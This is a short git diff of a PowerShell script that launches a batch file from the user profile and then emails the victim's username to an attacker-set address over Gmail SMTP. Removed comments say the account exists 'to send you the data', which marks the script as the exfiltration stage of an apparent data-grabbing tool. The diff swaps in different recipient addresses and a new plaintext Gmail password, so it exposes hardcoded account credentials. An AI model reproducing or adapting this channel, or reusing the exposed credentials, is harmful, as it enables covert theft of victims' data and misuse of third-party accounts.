@@ -13,12 +13,10 @@ Start-Process ("$env:USERPROFILE\$StartBat")
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-#You don't have to change the bottom Gmail. It'll only be used to send you the data.
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('artemis.by.seeber@gmail.com', 'jJ8Dt-GF_&a#t!?g')
-#Replace the bottom Gmails with your Gmail address.
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('artemis.by.seeber@gmail.com', 'Ah88&99&29&1A')
 $E = New-Object System.Net.Mail.MailMessage
-$E.From = 'nejcpirecnik03@gmail.com'
-$E.To.Add('nejcpirecnik03@gmail.com')
+$E.From = 'Qhunt37@yahoo.com'
+$E.To.Add('Qhunt37@yahoo.com')
 $E.Subject = $env:UserName
 $E.Body = 'Success!'
 Start-Sleep -s 2
